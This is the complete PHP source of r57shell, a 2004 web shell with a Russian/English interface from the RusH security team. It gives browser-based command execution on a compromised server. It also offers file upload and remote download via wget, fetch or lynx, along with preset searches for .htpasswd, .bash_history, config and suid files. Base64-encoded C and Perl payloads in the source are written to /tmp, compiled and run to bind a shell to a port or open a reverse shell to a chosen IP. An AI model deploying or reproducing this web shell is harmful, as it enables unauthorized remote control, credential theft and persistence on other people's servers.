<?
/******************************************************************************************************/
/*
/*                                 __________               ___ ___
/*                                 \______   \__ __  ______/   |   \
/*                                  |       _/  |  \/  ___/    _    \
/*                                  |    |   \  |  /\___ \\         /
/*                                  |____|_  /____//____  >\___|_  /
/*                                  -======\/==security=\/=team==\/
/*
/*
/*
/*  r57shell.php - скрипт на пхп позволяющий вам выполнять шелл команды  на сервере через браузер
/*  Вы можете скачать новую версию на нашем сайте: http://rst.void.ru
/*  Версия: 1.1 от 14.10.2004 (public 31.12.2004. Happy new year!!!)
/*
/*  Возможности:
/*  ~ защита скрипта с помощью пароля
/*  ~ выполнение шелл-команд
/*  ~ загрузка файлов на сервер
/*  ~ загрузка файлов с удаленного сервера с помощью wget, fetch или lynx
/*  ~ поддерживает алиасы команд
/*  ~ включены алиасы команд:
/*    - поиск на сервере всех файлов с suid битом
/*    - поиск на сервере всех файлов с sgid битом
/*    - поиск на сервере файлов config.inc.php
/*    - поиск на сервере всех директорий и файлов доступных на запись для всех
/*    - поиск на сервере файлов service.pwd
/*    - поиск на сервере файлов .htpasswd
/*    - поиск на сервере файлов .bash_history
/*    - поиск на сервере файлов config*
/*    - поиск на сервере файлов .fetchmailrc
/*    - вывод списка атрибутов файлов на файловой системе ext2fs
/*  ~ для алиасов поиска доступны как поиск начиная с корня так и поиск только в текущей директории
/*  ~ два языка интерфейса: русский, английский
/*  ~ возможность забиндить /bin/bash на определенный порт с помощью Perl или С кода
/*  ~ возможность делать back-connect с помощью Perl или С кода
/*  ~ вывод значений $OSTYPE и sysctl
/*
/*  Отличия от версии 1.0c:
/*  - Добавлена функция back-connect с помощью кода на Perl
/*  - Добавлена функция back-connect с помощью кода на C
/*  - Добавлена функция bind с помощью кода на Perl
/*  - Немного оптимизировал код собрав раскиданный html в переменные
/*  - В алиасы добавлены новые команды
/*  - Добавлен вывод sysctl
/*  - Добавлен вывод переменной $OSTYPE
/*  - Добавлена возможность загрузки файлов с удаленного сервера с использованием wget, fetch или lynx
/*
/*  Отличия от версии 1.0 beta:
/*  - Исправлен мелкий недочет в функции привязки порта.
/*
/*  14.10.2004 (c) RusH security team
/*
/******************************************************************************************************/

// Аутентификация

// Логин и пароль для доступа к скрипту
// НЕ ЗАБУДЬТЕ СМЕНИТЬ ПЕРЕД РАЗМЕЩЕНИЕМ НА СЕРВЕРЕ!!!
/*
$name="djskel"; // логин пользователя
$pass="XYFifA"; // пароль пользователя

if (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) || $HTTP_SERVER_VARS['PHP_AUTH_USER']!=$name || $HTTP_SERVER_VARS['PHP_AUTH_PW']!=$pass)
   {
   header("WWW-Authenticate: Basic realm=\"r57shell\"");
   header("HTTP/1.0 401 Unauthorized");
   exit("Access Denied");
   }
*/
error_reporting(0);
set_time_limit(0);
set_magic_quotes_runtime(0);
$err=0;

/*
Выбор языка
$language='ru' - русский
$language='eng' - английский
*/
$language='ru';

$lang=array(
           'ru_text1'  => 'Выполненная команда',
           'ru_text2'  => 'Выполнение команд на сервере',
           'ru_text3'  => 'Выполнить команду',
           'ru_text4'  => 'Рабочая директория',
           'ru_text5'  => 'Загрузка файлов на сервер',
           'ru_text6'  => 'Локальный файл',
           'ru_text7'  => 'Алиасы',
           'ru_text8'  => 'Выберите алиас',
           'ru_butt1'  => 'Выполнить',
           'ru_butt2'  => 'Загрузить',
           'ru_text9'  => 'Открытие порта и привязка его к /bin/bash',
           'ru_text10' => 'Открыть порт',
           'ru_text11' => 'Пароль для доступа',
           'ru_butt3'  => 'Открыть',
           'ru_text12' => 'back-connect',
           'ru_text13' => 'IP-адрес',
           'ru_text14' => 'Порт',
           'ru_butt4'  => 'Выполнить',
           'ru_text15' => 'Загрузка файлов с удаленного сервера',
           'ru_text16' => 'Использовать',
           'ru_text17' => 'Удаленный файл',
           'ru_text18' => 'Локальный файл',
           'ru_text19' => 'Exploits',
           'ru_text20' => 'Использовать',
           
           'eng_text1'  => 'Executed command',
           'eng_text2'  => 'Execute command on server',
           'eng_text3'  => '&nbsp;Run command',
           'eng_text4'  => 'Work directory',
           'eng_text5'  => 'Upload files on server',
           'eng_text6'  => 'Local file',
           'eng_text7'  => 'Aliases',
           'eng_text8'  => 'Select alias',
           'eng_butt1'  => 'Execute',
           'eng_butt2'  => 'Upload',
           'eng_text9'  => 'Bind port to /bin/bash',
           'eng_text10' => 'Port',
           'eng_text11' => 'Password for access',
           'eng_butt3'  => 'Bind',
           'eng_text12' => 'back-connect',
           'eng_text13' => 'IP',
           'eng_text14' => 'Port',
           'eng_butt4'  => 'Connect',
           'eng_text15' => 'Upload files from remote server',
           'eng_text16' => '       With',
           'eng_text17' => '  Remote file',
           'eng_text18' => '   Local file',
           'eng_text19' => 'Exploits',
           'eng_text20' => '         Use',
           );



/*
Алиасы команд
Позволяют избежать многократного набора одних и тех-же команд. ( Сделано благодаря моей природной лени )
Вы можете сами добавлять или изменять команды.
*/

$aliases=array(

/* поиск на сервере всех файлов с suid битом */
'find all suid files' => 'find / -type f -perm -04000 -ls',

/* поиск в текущей директории всех файлов с suid битом */
'find suid files in current dir' => 'find . -type f -perm -04000 -ls',

/* поиск на сервере всех файлов с sgid битом */
'find all sgid files' => 'find / -type f -perm -02000 -ls',

/* поиск в текущей директории всех файлов с sgid битом */
'find sgid files in current dir' => 'find . -type f -perm -02000 -ls',

/* поиск на сервере файлов config.inc.php */
'find config.inc.php files' => 'find / -type f -name config.inc.php',

/* поиск на сервере файлов config* */
'find config* files' => 'find / -type f -name "config*"',

/* поиск в текущей директории файлов config* */
'find config* files in current dir' => 'find . -type f -name "config*"',

/* поиск на сервере всех директорий и файлов доступных на запись для всех */
'find all writable directories and files' => 'find / -perm -2 -ls',

/* поиск в текущей директории всех директорий и файлов доступных на запись для всех */
'find all writable directories and files in current dir' => 'find . -perm -2 -ls',

/* поиск на сервере файлов service.pwd ... frontpage =))) */
'find all service.pwd files' => 'find / -type f -name service.pwd',

/* поиск в текущей директории файлов service.pwd */
'find service.pwd files in current dir' => 'find . -type f -name service.pwd',

/* поиск на сервере файлов .htpasswd */
'find all .htpasswd files' => 'find / -type f -name .htpasswd',

/* поиск в текущей директории файлов .htpasswd */
'find .htpasswd files in current dir' => 'find . -type f -name .htpasswd',

/* поиск всех файлов .bash_history */
'find all .bash_history files' => 'find / -type f -name .bash_history',

/* поиск в текущей директории файлов .bash_history */
'find .bash_history files in current dir' => 'find . -type f -name .bash_history',

/* поиск всех файлов .fetchmailrc */
'find all .fetchmailrc files' => 'find / -type f -name .fetchmailrc',

/* поиск в текущей директории файлов .fetchmailrc */
'find .fetchmailrc files in current dir' => 'find . -type f -name .fetchmailrc',

/* вывод списка атрибутов файлов на файловой системе ext2fs */
'list file attributes on a Linux second extended file system' => 'lsattr -va',

/* просмотр открытых портов */
'show opened ports' => 'netstat -an | grep -i listen',

'----------------------------------------------------------------------------------------------------' => 'ls -la'
);

/* html */

$table_up1 = "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: ";
$table_up2 = " ::</div></b></font></td></tr><tr><td>";
$table_up3 = "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc>";
$table_end1 = "</td></tr></table>";

/* -------------------------- Port bind source C ------------------------ */
$port_bind_bd_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5
jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5
ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW5
0IGFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnV
mWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVtb3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0
KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyh
hdG9pKGFyZ3ZbMV0pKTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0F
OWSk7IA0KIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULFNPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2N
rZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2F
kZHIgKikmcmVtb3RlLCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB
7DQogICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7DQogICBkdXAyKG5ld2ZkLDApOw0KICAgZHV
wMihuZXdmZCwxKTsNCiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ
6IiwxMCk7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyh
hcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY29tZSB0byByNTcgc2hlbGwgJiYgL2J
pbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGN
sb3NlKG5ld2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW5
0ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVudGVyZWQpO2krKykgDQp7DQppZih
lbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID0
9ICdccicpDQplbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCk
pDQpyZXR1cm4gMDsNCn0=";
/* -------------------------- END Port bind source C -------------------- */

/* -------------------------- Port bind perl source --------------------- */
$port_bind_bd_pl="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZi
AoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMSVNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2
NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORV
QsJlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQ
pzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZH
JfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw
0KbGlzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCm
FjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspKQ0Kew0KZGllICJDYW5ub3QgZm9yayIgaW
YgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+Jk
NPTk4iOw0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ0
9OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3NlIENPTk47DQpleGl0IDA7DQp9DQp9";
/* -------------------------- END Port bind perl source ----------------- */

/* -------------------------- back connect Perl source ------------------ */
$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJ
HN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2VjaG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZ
DsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJ
HRhcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0L
CAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgnd
GNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBka
WUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yO
iAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLR
VQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlK
FNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
/* -------------------------- END back connect Perl source -------------- */

/* -------------------------- back connect C source --------------------- */
$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0
KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10
pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJ
ybSAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2l
uLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA
9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMSt
zdHJsZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVB
QUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLCAoc3RydWN0IHNvY2thZGRyICopICZzaW4
sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCg
pIik7DQogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1
zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEpOw0KIGR1cDIoZmQsIDIpOw0KIGV4ZWN
sKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
/* -------------------------- END back connect C source ----------------- */
?>

<!-- Здравствуй  Вася -->
<html>
<head>
<title>r57shell</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<STYLE>
tr {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #eeeeee 1px solid;
BORDER-LEFT:   #eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
td {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #eeeeee 1px solid;
BORDER-LEFT:   #eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
table {
BORDER-RIGHT:  #eeeeee 1px outset;
BORDER-TOP:    #eeeeee 1px outset;
BORDER-LEFT:   #eeeeee 1px outset;
BORDER-BOTTOM: #eeeeee 1px outset;
BACKGROUND-COLOR: #D4D0C8;
}
input {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
}
select {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
}
submit {
BORDER-RIGHT:  buttonhighlight 2px outset;
BORDER-TOP:    buttonhighlight 2px outset;
BORDER-LEFT:   buttonhighlight 2px outset;
BORDER-BOTTOM: buttonhighlight 2px outset;
BACKGROUND-COLOR: #e4e0d8;
width: 30%;
}
textarea {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: Fixedsys bold;

}
BODY {
margin-top: 1px;
margin-right: 1px;
margin-bottom: 1px;
margin-left: 1px;
}
A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}
</STYLE>

</head>
<body bgcolor="#e4e0d8">
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td bgcolor=#cccccc>
<!-- logo -->
<font face=Verdana size=2>&nbsp;&nbsp;
<font face=Webdings size=6><b>!</b></font><b>&nbsp;&nbsp;r57shell</b>
</font>
</td></tr><table>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td align=right width=100>

<?

/* change dir */
if (!empty($HTTP_POST_VARS['dir'])) { chdir($HTTP_POST_VARS['dir']); }
$dir = getcwd();

/* display information */
echo "<font face=Verdana size=-2>";
echo '<font color=blue><b>uname -a :&nbsp;<br>sysctl :&nbsp;<br>$OSTYPE :&nbsp;<br>id :&nbsp;<br>pwd :&nbsp;</b></font><br>';
echo "</td><td>";
echo "<font face=Verdana size=-2 color=red><b>";
echo "&nbsp;&nbsp;&nbsp; ".exec("uname -a")."<br>";
$bsd1 = `/sbin/sysctl -n kern.ostype`;
$bsd2 = `/sbin/sysctl -n kern.osrelease`;
$lin1 = `/sbin/sysctl -n kernel.ostype`;
$lin2 = `/sbin/sysctl -n kernel.osrelease`;
if (!empty($bsd1)&&!empty($bsd2)) { $sysctl = "$bsd1 $bsd2"; }
else if (!empty($lin1)&&!empty($lin2)) {$sysctl = "$lin1 $lin2"; }
else { $sysctl = "-"; }
echo "&nbsp;&nbsp;&nbsp; ".$sysctl."<br>";
echo "&nbsp;&nbsp;&nbsp; ".exec('echo $OSTYPE')."<br>";
echo "&nbsp;&nbsp;&nbsp; ".exec("id")."<br>";
echo "&nbsp;&nbsp;&nbsp; ".$dir;
echo "</b></font>";
echo "</font>";
echo $table_end1;

/* port bind C */
if (!empty($HTTP_POST_VARS['port'])&&!empty($HTTP_POST_VARS['bind_pass'])&&($HTTP_POST_VARS['use']=="C"))
{
 $w_file=fopen("/tmp/bd.c","ab+") or $err=1;
 if($err==1)
 {
 echo "<font color=red face=Fixedsys><div align=center>Error! Can't write in /tmp/bd.c</div></font>";
 $err=0;
 }
 else
 {
 fputs($w_file,base64_decode($port_bind_bd_c));
 fclose($w_file);
 $blah=exec("gcc -o /tmp/bd /tmp/bd.c");
 unlink("/tmp/bd.c");
 $bind_string="/tmp/bd ".$HTTP_POST_VARS['port']." ".$HTTP_POST_VARS['bind_pass']." &";
 $blah=exec($bind_string);
 $HTTP_POST_VARS['cmd']="ps -aux | grep bd";
 $err=0;
 }
}

/* port bind Perl */
if (!empty($HTTP_POST_VARS['port'])&&!empty($HTTP_POST_VARS['bind_pass'])&&($HTTP_POST_VARS['use']=="Perl"))
{
 $w_file=fopen("/tmp/bdpl","ab+") or $err=1;
 if($err==1)
 {
 echo "<font color=red face=Fixedsys><div align=center>Error! Can't write in /tmp/bdpl</div></font>";
 $err=0;
 }
 else
 {
 fputs($w_file,base64_decode($port_bind_bd_pl));
 fclose($w_file);
 $bind_string="perl /tmp/bdpl ".$HTTP_POST_VARS['port']." &";
 $blah=exec($bind_string);
 $HTTP_POST_VARS['cmd']="ps -aux | grep bdpl";
 $err=0;
 }
}

/* back connect Perl */
if (!empty($HTTP_POST_VARS['ip']) && !empty($HTTP_POST_VARS['port']) && ($HTTP_POST_VARS['use']=="Perl"))
{
 $w_file=fopen("/tmp/back","ab+") or $err=1;
 if($err==1)
 {
 echo "<font color=red face=Fixedsys><div align=center>Error! Can't write in /tmp/back</div></font>";
 $err=0;
 }
 else
 {
 fputs($w_file,base64_decode($back_connect));
 fclose($w_file);
 $bc_string="perl /tmp/back ".$HTTP_POST_VARS['ip']." ".$HTTP_POST_VARS['port']." &";
 $blah=exec($bc_string);
 $HTTP_POST_VARS['cmd']="echo \"Now script try connect to ".$HTTP_POST_VARS['ip']." port ".$HTTP_POST_VARS['port']." ...\"";
 $err=0;
 }
}

/* back connect C */
if (!empty($HTTP_POST_VARS['ip']) && !empty($HTTP_POST_VARS['port']) && ($HTTP_POST_VARS['use']=="C"))
{
 $w_file=fopen("/tmp/back.c","ab+") or $err=1;
 if($err==1)
 {
 echo "<font color=red face=Fixedsys><div align=center>Error! Can't write in /tmp/back.c</div></font>";
 $err=0;
 }
 else
 {
 fputs($w_file,base64_decode($back_connect_c));
 fclose($w_file);
 $blah=exec("gcc -o /tmp/backc /tmp/back.c");
 unlink("/tmp/back.c");
 $bc_string="/tmp/backc ".$HTTP_POST_VARS['ip']." ".$HTTP_POST_VARS['port']." &";
 $blah=exec($bc_string);
 $HTTP_POST_VARS['cmd']="echo \"Now script try connect to ".$HTTP_POST_VARS['ip']." port ".$HTTP_POST_VARS['port']." ...\"";
 $err=0;
 }
}

/* alias execute */
if (!empty($HTTP_POST_VARS['alias']))
 {
 foreach ($aliases as $alias_name=>$alias_cmd) {
                                               if ($HTTP_POST_VARS['alias'] == $alias_name) {$HTTP_POST_VARS['cmd']=$alias_cmd;}
                                               }
 }

/* file upload */
if (!empty($HTTP_POST_FILES["userfile"]))
{
copy($HTTP_POST_FILES["userfile"][tmp_name],
            $HTTP_POST_VARS['dir']."/".$HTTP_POST_FILES["userfile"][name])
      or print("<font color=red face=Fixedsys><div align=center>Error uploading file ".$HTTP_POST_FILES["userfile"][name]."</div></font>");
}


/* file upload from remote host */
if (!empty($HTTP_POST_VARS['with']) && !empty($HTTP_POST_VARS['rem_file']) && !empty($HTTP_POST_VARS['loc_file']))
{
 if ($HTTP_POST_VARS['with'] == "wget") { $HTTP_POST_VARS['cmd'] = "wget ".$HTTP_POST_VARS['rem_file']." -O ".$HTTP_POST_VARS['loc_file'].""; }
 else if ($HTTP_POST_VARS['with'] == "fetch") { $HTTP_POST_VARS['cmd']= "fetch -p ".$HTTP_POST_VARS['rem_file']." -o ".$HTTP_POST_VARS['loc_file'].""; }
 else if ($HTTP_POST_VARS['with'] == "lynx") { $HTTP_POST_VARS['cmd']= "lynx -source ".$HTTP_POST_VARS['rem_file']." > ".$HTTP_POST_VARS['loc_file'].""; }
}

/* command execute */
echo $table_up3;
if ((!$HTTP_POST_VARS['cmd']) || ($HTTP_POST_VARS['cmd']=="")) { $HTTP_POST_VARS['cmd']="ls -lia"; }
echo "<font face=Verdana size=-2>".$lang[$language._text1].": <b>".$HTTP_POST_VARS['cmd']."</b></font></td></tr><tr><td>";
echo "<b>";
echo "<div align=center><textarea name=report cols=121 rows=15>";
echo "".passthru($HTTP_POST_VARS['cmd'])."";
echo "</textarea></div>";
echo "</b>";
echo $table_end1;

/* command execute form */
echo $table_up1; echo $lang[$language._text2]; echo $table_up2;
echo "<form name=command method=post>";
echo "<font face=Verdana size=-2>";
echo "<b>&nbsp;".$lang[$language._text3]." <font face=Wingdings color=gray>и</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<input type=text name=cmd size=85>&nbsp;&nbsp;<br>";
echo "<b>&nbsp;".$lang[$language._text4]." <font face=Wingdings color=gray>и</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<input type=text name=dir size=85 value=".$dir.">";
echo "&nbsp;<input type=submit name=submit value=\" ".$lang[$language._butt1]." \">";
echo "</font>";
echo "</form>";
echo $table_end1;

/* aliases form */
echo $table_up1; echo $lang[$language._text7]; echo $table_up2;
echo "<form name=aliases method=POST>";
echo "<font face=Verdana size=-2>";
echo "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".$lang[$language._text8]." <font face=Wingdings color=gray>и</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<select name=alias>";
foreach ($aliases as $alias_name=>$alias_cmd)
 {
 echo "<option>$alias_name</option>";
 }
 echo "</select>";
echo "<input type=hidden name=dir value=".$dir.">";
echo "&nbsp;<input type=submit name=submit value=\" ".$lang[$language._butt1]." \">";
echo "</font>";
echo "</form>";
echo $table_end1;

/* file upload form */
echo $table_up1; echo $lang[$language._text5]; echo $table_up2;
echo "<form name=upload method=POST ENCTYPE=multipart/form-data>";
echo "<font face=Verdana size=-2>";
echo "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".$lang[$language._text6]." <font face=Wingdings color=gray>и</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<input type=file name=userfile size=85>&nbsp;";
echo "<input type=hidden name=dir value=".$dir.">";
echo "<input type=submit name=submit value=\" ".$lang[$language._butt2]." \">";
echo "</font>";
echo "</form>";
echo $table_end1;

/* file upload from remote host form */
echo $table_up1; echo $lang[$language._text15]; echo $table_up2;
echo "<form name=remote_upload method=POST>";
echo "<font face=Verdana size=-2>";
echo "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".$lang[$language._text16]." <font face=Wingdings color=gray>и</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<select size=\"1\" name=\"with\">";
echo "<option value=\"wget\">wget</option>";
echo "<option value=\"fetch\">fetch</option>";
echo "<option value=\"lynx\">lynx</option>";
echo "</select>&nbsp;<br>";
echo "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".$lang[$language._text17]." <font face=Wingdings color=gray>и</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<input type=text name=rem_file value=http:// size=85>&nbsp;&nbsp;<br>";
echo "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".$lang[$language._text18]." <font face=Wingdings color=gray>и</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<input type=text name=loc_file size=85 value=".$dir.">&nbsp;";
echo "<input type=hidden name=dir value=".$dir.">";
echo "<input type=submit name=submit value=\" ".$lang[$language._butt2]." \">";
echo "</font>";
echo "</form>";
echo $table_end1;

/* port bind form */
echo $table_up1; echo $lang[$language._text9]; echo $table_up2;
echo "<form name=bind method=POST>";
echo "<font face=Verdana size=-2>";
echo "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".$lang[$language._text10]." <font face=Wingdings color=gray>и</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<input type=text name=port size=15 value=11457>&nbsp;";
echo "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".$lang[$language._text11]." <font face=Wingdings color=gray>и</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<input type=text name=bind_pass size=15 value=r57>&nbsp;";
echo "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".$lang[$language._text20]." <font face=Wingdings color=gray>и</font>&nbsp;</b>";
echo "<select size=\"1\" name=\"use\">";
echo "<option value=\"Perl\">Perl</option>";
echo "<option value=\"C\">C</option>";
echo "</select>&nbsp;";
echo "<input type=hidden name=dir value=".$dir.">";
echo "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=submit value=\" ".$lang[$language._butt3]." \">";
echo "</font>";
echo "</form>";
echo $table_end1;

/* back connect form */
echo $table_up1; echo $lang[$language._text12]; echo $table_up2;
echo "<form name=back method=POST>";
echo "<font face=Verdana size=-2>";
echo "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".$lang[$language._text13]." <font face=Wingdings color=gray>и</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<input type=text name=ip size=15 value=127.0.0.1>&nbsp;";
echo "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".$lang[$language._text14]." <font face=Wingdings color=gray>и</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<input type=text name=port size=15 value=31337>&nbsp;";
echo "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".$lang[$language._text20]." <font face=Wingdings color=gray>и</font>&nbsp;</b>";
